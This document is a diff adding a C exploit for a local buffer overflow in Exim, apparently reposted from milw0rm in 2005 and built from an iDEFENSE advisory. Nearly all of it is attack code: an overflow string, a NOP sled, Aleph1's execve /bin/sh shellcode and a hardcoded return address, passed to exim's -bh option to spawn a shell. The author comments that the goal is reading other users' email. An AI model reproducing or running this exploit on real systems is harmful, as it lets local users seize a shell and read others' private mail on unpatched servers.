@@ -1,0 +1,70 @@
+/* 
+ * ripped straight off iDEFENSE advisory - so lazy I just picked
+ * up GDB... bored on a weeknight :(
+ * 
+ * nothing to write home to mother about due to the fact that
+ * you need a local user account on a server and all you
+ * get is to read other people's emails ....
+ * 
+ * not even my own shellcode. aleph1 shellcode - cut and paste job 
+ * with nops to pad.
+ *
+ * Regards,
+ * Plugger aka Tony Lockett
+ *
+ * 
+ * 
+ */
+
+char bomb[288]=
+
+/* the gear from iDEFENSE */
+"::%A:::::::::::::::::"                             /* 21 bytes  */
+                                                    /* --------  */
+/* NOPS for padding */
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90"                                          /* 218 bytes */
+                                                    /* --------- */
+/* actual code courtesy Aleph1 */
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89"  /* 12 bytes  */
+"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"  /* 12 bytes  */
+"\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80"              /* 9 bytes   */
+"\xe8\xdc\xff\xff\xff/bin/sh"                       /* 12 bytes  */
+
+/* where EIP should point */
+"\xf4\xf2\xff\xbf";                                 /*  4 bytes  */
+                                                    /* --------  */
+                                                    /* 49 bytes  */
+                                                    /* --------  */
+                                                    /* 288 bytes */
+                                                    /* ========= */
+main()
+{
+  char *exim[4];
+  exim[0] = "/usr/exim/bin/exim";
+  exim[1] = "-bh";
+  exim[2] = bomb;
+  exim[3] = 0x0;
+  printf("Firing up exim - cross your fingers for shell!\n");
+  execve(exim[0],exim,0x0);
+  return;
+}
+
+// milw0rm.com [2005-05-25]
